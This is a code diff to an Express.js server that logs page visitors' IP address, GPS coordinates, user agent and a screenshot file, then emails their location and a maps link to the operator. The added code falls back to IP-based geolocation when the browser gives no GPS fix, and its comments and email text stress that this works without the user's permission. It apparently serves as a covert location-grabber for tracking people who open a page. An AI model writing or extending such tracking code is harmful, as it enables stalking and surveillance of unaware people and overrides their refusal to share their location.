@@ -49,10 +49,12 @@ async function sendLocationEmail(visitData) {
 
                     ${visitData.latitude && visitData.longitude ? `
                         <div style="background: white; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
-                            <p><strong>📍 Ubicación GPS:</strong></p>
+                            <p><strong>📍 Ubicación ${visitData.location_method === 'IP (sin permisos)' ? '(Aproximada por IP)' : 'GPS'}:</strong></p>
                             <p>Latitud: ${visitData.latitude.toFixed(6)}</p>
                             <p>Longitud: ${visitData.longitude.toFixed(6)}</p>
-                            <p>Precisión: ${visitData.accuracy ? visitData.accuracy.toFixed(0) + ' metros' : 'N/A'}</p>
+                            <p>Método: ${visitData.location_method || 'GPS'}</p>
+                            <p>Precisión: ${visitData.accuracy ? (typeof visitData.accuracy === 'number' ? visitData.accuracy.toFixed(0) + ' metros' : visitData.accuracy) : 'N/A'}</p>
+                            ${visitData.location_method === 'IP (sin permisos)' ? '<p style="color: #ff9800; font-size: 12px;">⚠️ Ubicación aproximada. No requirió permisos del usuario.</p>' : ''}
                             <p style="margin-top: 10px;">
                                 <a href="${mapsUrl}" 
                                    style="background: #4caf50; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block;">
@@ -124,6 +126,29 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
+// Función para obtener ubicación aproximada por IP (sin permisos)
+async function getLocationByIP(ip) {
+    try {
+        // Usar servicio gratuito de geolocalización por IP
+        const response = await fetch(`http://ip-api.com/json/${ip}`);
+        const data = await response.json();
+        
+        if (data.status === 'success') {
+            return {
+                latitude: data.lat,
+                longitude: data.lon,
+                city: data.city,
+                country: data.country,
+                accuracy: 'Aproximada (por IP)',
+                method: 'IP'
+            };
+        }
+    } catch (error) {
+        console.error('Error obteniendo ubicación por IP:', error);
+    }
+    return null;
+}
+
 // Ruta para registrar la visita con geolocalización
 app.post('/api/log-visit', async (req, res) => {
     const ip = getClientIP(req);
@@ -146,9 +171,27 @@ app.post('/api/log-visit', async (req, res) => {
         }
     }
 
+    // Si no hay GPS del navegador, obtener ubicación por IP (sin permisos)
+    let finalLatitude = latitude;
+    let finalLongitude = longitude;
+    let finalAccuracy = accuracy;
+    let locationMethod = 'GPS';
+
+    if (!latitude || !longitude) {
+        const ipLocation = await getLocationByIP(ip);
+        if (ipLocation) {
+            finalLatitude = ipLocation.latitude;
+            finalLongitude = ipLocation.longitude;
+            finalAccuracy = ipLocation.accuracy;
+            locationMethod = 'IP (sin permisos)';
+            console.log('📡 Ubicación obtenida por IP (sin permisos necesarios)');
+        }
+    }
+
     console.log('📍 Nueva visita detectada:', {
         ip,
-        location: latitude && longitude ? `${latitude}, ${longitude}` : 'Sin ubicación',
+        location: finalLatitude && finalLongitude ? `${finalLatitude}, ${finalLongitude}` : 'Sin ubicación',
+        method: locationMethod,
         screenshot: screenshotFilename ? '✓' : '✗'
     });
 
@@ -156,9 +199,10 @@ app.post('/api/log-visit', async (req, res) => {
     const visitData = {
         timestamp,
         ip,
-        latitude: latitude || null,
-        longitude: longitude || null,
-        accuracy: accuracy || null,
+        latitude: finalLatitude || null,
+        longitude: finalLongitude || null,
+        accuracy: finalAccuracy || null,
+        location_method: locationMethod,
         user_agent: userAgent,
         screenshot_file: screenshotFilename
     };
